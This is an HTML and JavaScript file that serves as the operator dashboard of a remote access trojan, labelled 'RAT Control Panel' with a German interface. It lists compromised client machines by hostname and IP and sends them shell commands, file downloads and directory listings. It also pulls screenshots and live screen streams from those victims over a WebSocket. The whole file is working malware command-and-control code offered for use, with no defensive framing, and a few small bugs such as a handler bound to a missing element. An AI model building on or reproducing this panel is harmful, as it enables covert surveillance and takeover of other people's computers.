<!DOCTYPE html>
<html lang="de" class="dark">
<head>
  <meta charset="UTF-8" />
  <title>RAT Control Panel</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="theme-color" content="#111827">
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css">
  <style>
    :root { --primary: #3b82f6; --darker: #111827; }
    body { background-color: var(--darker); font-family: 'Inter', sans-serif; }
    .glass-effect { background: rgba(31, 41, 55, 0.5); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
    .client-card.selected { box-shadow: 0 0 0 2px var(--primary), 0 0 10px rgba(59, 130, 246, 0.5); }
    .status-dot { animation: pulse 2s infinite; }
    @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
    .command-input:focus { border-color: var(--primary); box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.2); }
    .output-area { background-color: rgba(17, 24, 39, 0.8); font-family: 'Menlo', 'Monaco', monospace; }
    .scrollbar-thin { scrollbar-width: thin; scrollbar-color: #4b5563 transparent; }
    .scrollbar-thin::-webkit-scrollbar { width: 6px; }
    .scrollbar-thin::-webkit-scrollbar-track { background: transparent; }
    .scrollbar-thin::-webkit-scrollbar-thumb { background-color: #4b5563; border-radius: 3px; }
    #sidebar { transition: transform 0.3s ease-in-out; }
    .quick-action { background-color: #374151; padding: 4px 8px; border-radius: 6px; font-size: 0.8rem; transition: background-color 0.2s; }
    .quick-action:hover { background-color: #4b5563; }
    @media (max-width: 767px) {
      #sidebar {
        position: fixed; top: 0; left: 0; height: 100%;
        transform: translateX(-100%); z-index: 40;
      }
      #sidebar.open { transform: translateX(0); }
      #sidebar-overlay {
        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
        background-color: rgba(0,0,0,0.5); z-index: 39;
      }
    }
  </style>
</head>
<body class="text-gray-200 min-h-screen">

  <div id="login-overlay" class="fixed inset-0 bg-gray-900 bg-opacity-80 flex items-center justify-center z-50">
    <div class="glass-effect rounded-xl p-8 w-full max-w-sm mx-4">
      <h1 class="text-3xl font-bold text-white text-center mb-6">Control Panel</h1>
      <form id="login-form" class="space-y-4">
        <input type="text" id="login-username" required placeholder="Benutzername" class="w-full px-4 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
        <input type="password" id="login-password" required placeholder="Passwort" class="w-full px-4 py-2 bg-gray-800 border border-gray-600 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-white">
        <div id="login-error" class="text-red-400 text-sm text-center hidden h-4"></div>
        <button type="submit" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded-lg transition">Login</button>
      </form>
    </div>
  </div>

  <div id="main-app" class="hidden">
    <div id="sidebar-overlay" class="hidden md:hidden" onclick="toggleSidebar()"></div>
    <div class="flex flex-col md:flex-row min-h-screen">
      <aside id="sidebar" class="w-72 bg-gray-900 p-4 flex flex-col md:relative flex-shrink-0">
        <h2 class="text-xl font-bold text-white mb-4">Clients (<span id="client-count">0</span>)</h2>
        <div class="flex gap-2 mb-4">
          <button id="refresh-clients" class="flex-1 bg-gray-700 hover:bg-gray-600 text-white px-3 py-2 rounded-lg text-sm"><i class="fas fa-sync-alt"></i></button>
          <button id="select-all-clients" class="flex-1 bg-blue-600 hover:bg-blue-700 text-white px-3 py-2 rounded-lg text-sm">Alle</button>
        </div>
        <div id="client-list" class="space-y-2 overflow-y-auto scrollbar-thin flex-1">
          <p class="text-gray-400 text-center py-8">Warte auf Clients...</p>
        </div>
      </aside>

      <main class="flex-1 flex flex-col">
        <header class="bg-gray-800/50 p-3 border-b border-gray-700 flex items-center justify-between">
          <button id="menu-toggle" class="md:hidden p-2 rounded-md hover:bg-gray-700"><i class="fas fa-bars text-xl"></i></button>
          <div class="text-sm text-gray-400">Ausgewählt: <span id="selected-count">0</span></div>
          <div id="connection-status" class="px-3 py-1 rounded-full text-xs font-medium bg-yellow-500 text-yellow-900">Verbinde...</div>
        </header>

        <div class="flex-1 flex flex-col lg:flex-row p-2 md:p-4 gap-4 overflow-hidden">
          <div class="flex-1 flex flex-col gap-4">
            <div class="bg-gray-800/50 rounded-lg p-3">
              <div class="flex gap-2">
                <input type="text" id="command-input" placeholder="Befehl eingeben..." class="command-input w-full px-4 py-2 rounded-lg text-white bg-gray-900 border border-gray-700 focus:outline-none">
                <button id="send-command" class="bg-blue-600 hover:bg-blue-700 text-white px-5 py-2 rounded-lg font-medium"><i class="fas fa-paper-plane"></i></button>
              </div>
              <div class="flex gap-2 mt-2 flex-wrap">
                <button class="quick-action" data-command="/systeminfo">Info</button>
                <button class="quick-action" data-command="/screenshot">Screenshot</button>
                <button class="quick-action" data-command="/ls">Dateien</button>
                <button class="quick-action" data-command="/screenstream_start">Bildschirm</button>
              </div>
            </div>
            <div class="output-area flex-1 p-3 rounded-lg overflow-y-auto scrollbar-thin text-sm" id="output-area">
              <p class="text-gray-500 text-center py-8">Bereit für Befehle...</p>
            </div>
          </div>

          <div class="w-full lg:w-96 bg-gray-800/50 rounded-lg p-3 flex flex-col flex-shrink-0">
            <h3 class="text-lg font-semibold text-white mb-2">Live Media</h3>
            <div id="media-container" class="flex-1 flex items-center justify-center bg-black rounded">
                <div id="media-placeholder" class="text-gray-500">Keine Medien</div>
                <img id="screenshot-img" class="hidden max-h-full max-w-full" alt="Screenshot">
                <canvas id="screen-canvas" class="hidden max-h-full max-w-full"></canvas>
            </div>
            <button id="stop-stream-btn" class="hidden w-full mt-2 bg-red-600 hover:bg-red-700 text-white py-1 rounded">Stream stoppen</button>
          </div>
        </div>
      </main>
    </div>
  </div>

  <div id="notifications" class="fixed top-4 right-4 z-50 space-y-2"></div>

  <script>
    let ws = null, selectedClients = new Set(), isAuthenticated = false, reconnectAttempts = 0;
    const $ = (id) => document.getElementById(id);

    function showNotification(message, type = 'info') {
      const colors = { success: 'bg-green-500', error: 'bg-red-500', info: 'bg-blue-500' };
      const el = document.createElement('div');
      el.className = `notification ${colors[type]} text-white px-4 py-2 rounded-lg shadow-lg text-sm`;
      el.textContent = message;
      $('notifications').appendChild(el);
      setTimeout(() => el.remove(), 3000);
    }

    function updateConnectionStatus(status) {
      const statuses = {
        connected: { text: 'Verbunden', class: 'bg-green-500 text-green-900' },
        connecting: { text: 'Verbinde...', class: 'bg-yellow-500 text-yellow-900' },
        disconnected: { text: 'Getrennt', class: 'bg-red-500 text-red-900' },
      };
      $('connection-status').textContent = statuses[status].text;
      $('connection-status').className = `px-3 py-1 rounded-full text-xs font-medium ${statuses[status].class}`;
    }

    function logOutput(message, type = 'info') {
      const colors = { info: 'text-gray-300', error: 'text-red-400', command: 'text-blue-400' };
      const entry = document.createElement('div');
      entry.className = `mb-2 p-1 rounded ${colors[type]}`;
      const sanitizedMessage = message.replace(/</g, "&lt;").replace(/>/g, "&gt;");
      entry.innerHTML = `<span class="text-gray-500 mr-2">[${new Date().toLocaleTimeString()}]</span> <pre class="inline-block whitespace-pre-wrap">${sanitizedMessage}</pre>`;
      if ($('output-area').innerHTML.includes("Bereit für Befehle")) $('output-area').innerHTML = '';
      $('output-area').appendChild(entry);
      $('output-area').scrollTop = $('output-area').scrollHeight;
    }

    function toggleSidebar() {
      $('sidebar').classList.toggle('open');
      $('sidebar-overlay').classList.toggle('hidden');
    }

    async function login(username, password) {
      try {
        const response = await fetch('/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username, password })
        });
        const data = await response.json();
        if (!response.ok) throw new Error(data.detail || 'Login fehlgeschlagen');
        localStorage.setItem('rat_token', data.token);
        isAuthenticated = true;
        $('login-overlay').classList.add('hidden');
        $('main-app').classList.remove('hidden');
        connectWebSocket();
      } catch (error) {
        $('login-error').textContent = error.message;
        $('login-error').classList.remove('hidden');
      }
    }

    function connectWebSocket() {
      const token = localStorage.getItem('rat_token');
      if (!token) return;
      updateConnectionStatus('connecting');
      const protocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
      ws = new WebSocket(`${protocol}//${location.host}/ws?token=${token}`);
      
      ws.onopen = () => { updateConnectionStatus('connected'); reconnectAttempts = 0; };
      ws.onmessage = handleWebSocketMessage;
      ws.onclose = (event) => {
        updateConnectionStatus('disconnected');
        if (event.code === 4401) { localStorage.removeItem('rat_token'); location.reload(); }
        else if (reconnectAttempts < 5) { reconnectAttempts++; setTimeout(connectWebSocket, 3000); }
      };
      ws.onerror = () => updateConnectionStatus('disconnected');
    }

    function handleWebSocketMessage(event) {
        const data = JSON.parse(event.data);
        switch (data.type) {
            case 'client_list': updateClientList(data.clients || []); break;
            case 'command_output': logOutput(data.output, 'info'); break;
            case 'screenshot': displayMedia('screenshot', data.data); break;
            case 'screen_frame': displayMedia('screen_frame', data.data); break;
            case 'error': logOutput(data.message, 'error'); break;
            default: console.log("Unhandled message:", data);
        }
    }

    function updateClientList(clients) {
      const listEl = $('client-list');
      listEl.innerHTML = '';
      $('client-count').textContent = clients.length;
      if (clients.length === 0) {
        listEl.innerHTML = '<p class="text-gray-400 text-center py-8">Warte auf Clients...</p>';
        return;
      }
      clients.forEach(client => {
        const osIcon = client.os.toLowerCase().includes('win') ? 'fab fa-windows' : 'fab fa-linux';
        const div = document.createElement('div');
        div.className = `client-card glass-effect p-3 rounded-lg cursor-pointer ${selectedClients.has(client.id) ? 'selected' : ''}`;
        div.dataset.clientId = client.id;
        div.innerHTML = `
          <div class="flex items-center justify-between">
            <div class="flex items-center overflow-hidden">
              <div class="status-dot w-2.5 h-2.5 bg-green-400 rounded-full mr-3 flex-shrink-0"></div>
              <i class="${osIcon} text-lg mr-2"></i>
              <span class="font-medium text-white truncate">${client.hostname}</span>
            </div>
            ${selectedClients.has(client.id) ? '<i class="fas fa-check-circle text-blue-400"></i>' : ''}
          </div>
          <div class="text-xs text-gray-400 mt-1 truncate">${client.ip}</div>`;
        div.onclick = () => toggleClientSelection(client.id);
        listEl.appendChild(div);
      });
    }

    function toggleClientSelection(clientId) {
      if (selectedClients.has(clientId)) selectedClients.delete(clientId);
      else selectedClients.add(clientId);
      $('selected-count').textContent = selectedClients.size;
      ws.send(JSON.stringify({ action: 'get_clients' }));
    }

    function sendCommandToClients() {
      const command = $('command-input').value.trim();
      if (!command || selectedClients.size === 0) return showNotification('Client und Befehl auswählen', 'error');
      
      const parts = command.split(' ');
      const payload = { action: parts[0].substring(1), target_ids: Array.from(selectedClients) };
      const args = parts.slice(1).join(' ');
      if (args) {
        if (payload.action === 'exec') payload.command = args;
        else if (['download', 'ls', 'cd'].includes(payload.action)) payload.path = args;
        else payload.argument = args;
      }
      ws.send(JSON.stringify(payload));
      logOutput(command, 'command');
      $('command-input').value = '';
    }

    function displayMedia(type, base64Data) {
        $('media-placeholder').classList.add('hidden');
        const screenshotImg = $('screenshot-img');
        const screenCanvas = $('screen-canvas');
        const stopBtn = $('stop-stream-btn');

        if (type === 'screenshot') {
            screenshotImg.src = `data:image/jpeg;base64,${base64Data}`;
            screenshotImg.classList.remove('hidden');
            screenCanvas.classList.add('hidden');
            stopBtn.classList.add('hidden');
        } else { // screen_frame
            const img = new Image();
            img.src = `data:image/jpeg;base64,${base64Data}`;
            img.onload = () => {
                screenCanvas.width = img.width;
                screenCanvas.height = img.height;
                screenCanvas.getContext('2d').drawImage(img, 0, 0);
            };
            screenshotImg.classList.add('hidden');
            screenCanvas.classList.remove('hidden');
            stopBtn.classList.remove('hidden');
        }
    }

    function stopStream() {
        $('command-input').value = '/screenstream_stop';
        sendCommandToClients();
        $('screen-canvas').classList.add('hidden');
        $('stop-stream-btn').classList.add('hidden');
        $('media-placeholder').classList.remove('hidden');
    }

    document.addEventListener('DOMContentLoaded', () => {
      $('login-form').onsubmit = (e) => { e.preventDefault(); login($('login-username').value, $('login-password').value); };
      $('menu-toggle').onclick = toggleSidebar;
      $('send-command').onclick = sendCommandToClients;
      $('command-input').onkeydown = (e) => e.key === 'Enter' && sendCommandToClients();
      $('refresh-clients').onclick = () => ws.send(JSON.stringify({ action: 'get_clients' }));
      $('select-all-clients').onclick = () => {
        document.querySelectorAll('.client-card').forEach(c => selectedClients.add(c.dataset.clientId));
        toggleClientSelection();
      };
      $('clear-output').onclick = () => { $('output-area').innerHTML = '<p class="text-gray-500 text-center py-8">Bereit für Befehle...</p>'; };
      $('stop-stream-btn').onclick = stopStream;
      document.querySelectorAll('.quick-action').forEach(btn => {
        btn.onclick = () => { $('command-input').value = btn.dataset.command; $('command-input').focus(); };
      });

      if (localStorage.getItem('rat_token')) {
        isAuthenticated = true;
        $('login-overlay').classList.add('hidden');
        $('main-app').classList.remove('hidden');
        connectWebSocket();
      }
    });
  </script>
</body>
</html>
